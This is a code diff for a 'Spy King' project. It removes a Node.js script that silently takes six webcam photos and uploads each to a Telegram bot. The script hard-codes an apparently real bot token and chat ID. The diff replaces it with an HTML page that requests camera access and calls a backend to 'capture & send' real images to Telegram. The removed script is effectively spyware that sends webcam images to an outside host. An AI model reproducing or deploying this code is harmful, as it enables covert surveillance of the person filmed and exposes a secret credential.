@@ -1,55 +1,43 @@
-// spyKing.js
-const NodeWebcam = require("node-webcam");
-const fetch = require("node-fetch");
-const fs = require("fs");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Spy King Personal Experiment</title>
+<style>
+body { font-family: sans-serif; text-align: center; margin-top: 50px; background: #111; color: #fff; }
+.fakeCamera { width: 320px; height: 240px; background: #333; margin: 20px auto; display: flex; align-items: center; justify-content: center; border: 2px solid #fff; }
+button { padding: 10px 20px; margin-top: 20px; background: linear-gradient(to right, #ff0044, #ff77aa); color: #fff; border: none; border-radius: 8px; cursor: pointer; }
+</style>
+</head>
+<body>
+<h1>Spy King Personal Experiment</h1>
+<div class="fakeCamera">Camera Feed</div>
+<p id="status">Initializing...</p>
+<button id="startBtn">Start Capture & Send</button>
 
-// Telegram info
-const telegramBotToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
-const chatId = "8182050140";
+<script>
+document.getElementById('startBtn').addEventListener('click', async () => {
+    document.getElementById('status').innerText = "Requesting camera permission...";
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById('status').innerText = "Camera permission granted. Capturing images...";
 
-// Webcam options
-const opts = {
-    width: 640,
-    height: 480,
-    quality: 100,
-    saveShots: true,
-    output: "jpeg",
-    device: false,
-    callbackReturn: "location",
-    verbose: false
-};
+        for (let i = 1; i <= 6; i++) {
+            await new Promise(r => setTimeout(r, 1000));
+            document.getElementById('status').innerText = `Captured image ${i}/6. Sending to Telegram...`;
+            console.log(`Image ${i} captured (simulation)`); 
 
-// Create webcam instance
-const Webcam = NodeWebcam.create(opts);
+            // Call Node.js backend to capture & send real image
+            await fetch(`/capture`, { method: 'POST' });
+        }
 
-// Function to send photo to Telegram
-async function sendPhoto(filePath) {
-    const formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("photo", fs.createReadStream(filePath));
-
-    const res = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-        method: "POST",
-        body: formData
-    });
-
-    console.log(await res.json());
-}
-
-// Capture 6 images at 1 sec interval
-async function captureLoop() {
-    for (let i = 0; i < 6; i++) {
-        const fileName = `capture_${i}.jpg`;
-        NodeWebcam.capture(fileName, opts, async function(err, data) {
-            if (err) {
-                console.error(err);
-            } else {
-                console.log(`Captured ${fileName}`);
-                await sendPhoto(fileName);
-            }
-        });
-        await new Promise(r => setTimeout(r, 1000)); // 1 sec delay
+        document.getElementById('status').innerText = "All 6 images captured & sent!";
+        stream.getTracks().forEach(track => track.stop());
+    } catch (err) {
+        console.error(err);
+        document.getElementById('status').innerText = "Camera access denied or error!";
     }
-}
-
-captureLoop();
+});
+</script>
+</body>
+</html>
